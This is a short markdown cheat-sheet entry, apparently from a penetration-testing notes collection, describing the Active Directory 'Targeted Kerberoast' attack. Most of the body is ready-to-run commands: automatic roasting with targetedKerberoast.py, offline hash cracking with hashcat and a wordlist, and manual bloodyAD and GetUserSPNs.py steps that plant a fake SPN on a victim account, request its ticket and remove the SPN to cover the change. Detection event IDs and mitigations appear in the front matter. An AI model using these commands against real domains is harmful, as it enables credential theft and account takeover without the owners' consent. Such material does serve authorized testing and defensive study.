---
title: Targeted Kerberoast
category: AD / ACL abuse
order: 60
tags: [targeted-kerberoast, writespn, servicePrincipalName, kerberos, bloodyad]
summary: >
  If you can write a target user's servicePrincipalName, give them an SPN, request
  their TGS, crack it offline, then remove the SPN. Turns a GenericWrite edge into
  that user's password (if it's weak).
prerequisites:
  - GenericWrite / GenericAll (WriteSPN) over the target user
  - The target must have a crackable password (service accounts often do; humans less so)
tools: [targetedKerberoast, impacket (GetUserSPNs), bloodyAD, PowerView]
detection:
  - 5136 writes to servicePrincipalName; 4769 TGS (RC4) for a user that normally has no SPN
mitigation:
  - Restrict WriteSPN; strong passwords; alert on SPN additions to user accounts
refs:
  - { label: "targetedKerberoast", url: "https://github.com/ShutdownRepo/targetedKerberoast" }
  - { label: "The Hacker Recipes — Kerberoast", url: "https://www.thehacker.recipes/ad/movement/kerberos/kerberoast" }
---

## Automatic (finds writable users, roasts, cleans up)

```sh
targetedKerberoast.py -v -d $domain -u $user -p $password
hashcat -m 13100 targetedkerberoast.txt /usr/share/wordlists/rockyou.txt --rules-file best64.rule
```

## Manual

```sh
# set a fake SPN on the target
bloodyAD -u $user -p $password -d $domain --host $dc_ip set object $target_user servicePrincipalName -v "fake/$target_user"
# request its TGS
GetUserSPNs.py $domain/$user:$password -dc-ip $dc_ip -request-user $target_user
# then remove the SPN you added
bloodyAD -u $user -p $password -d $domain --host $dc_ip remove object $target_user servicePrincipalName
```

> Only worth it if the target likely has a weak password. Against a human user
> with a strong password, prefer **Shadow Credentials** (no cracking needed).
